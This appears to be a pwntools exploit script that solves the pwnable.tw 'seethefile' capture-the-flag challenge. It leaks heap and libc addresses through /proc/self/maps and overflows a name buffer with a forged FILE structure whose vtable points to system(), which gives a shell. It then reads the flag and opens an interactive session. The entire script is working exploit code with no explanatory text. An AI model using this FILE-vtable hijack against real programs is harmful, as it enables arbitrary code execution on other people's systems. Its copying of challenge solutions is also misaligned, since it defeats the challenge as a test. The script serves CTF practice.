from pwn import *

server = remote('chall.pwnable.tw', 10200)
libc = ELF('./libc_32.so.6')

server.recvuntil('Your choice :')
server.sendline('1')
server.recvuntil('see :')
server.sendline('/proc/self/maps')
server.recvuntil('Your choice :')
server.sendline('2')
server.recvuntil('Your choice :')
server.sendline('3')

server.recvline()
server.recvline()
server.recvline()

heap = int(server.recvline()[:8], 16)
success('heap: ' + hex(heap))
libc.address = int(server.recvline()[:8], 16) + 0x1000
success('libc_base: ' + hex(libc.address))
system = libc.sym['system']

server.recvuntil('Your choice :')
server.sendline('4')
server.recvuntil('Your choice :')
server.sendline('1')
server.recvuntil('see :')
server.sendline('/proc/self/maps')

payload = '\x00'*32 + p32(0x0804b300)
payload += '\x00'*(0x80 - 4)

file = '\xff\xff\xff\xff;$0\x00'.ljust(0x48, '\x00')
file = file.ljust(0x94, '\x00')
payload += file
payload += p32(0x0804b300 + 0x98)
#vtable
payload += p32(system)*21

server.recvuntil('Your choice :')
server.sendline('5')
server.recvuntil('Leave your name :')
server.sendline(payload)

server.sendline("/home/seethefile/get_flag")
server.recvuntil("magic :")
server.send("Give me the flag\x00")
print server.recv()
server.interactive()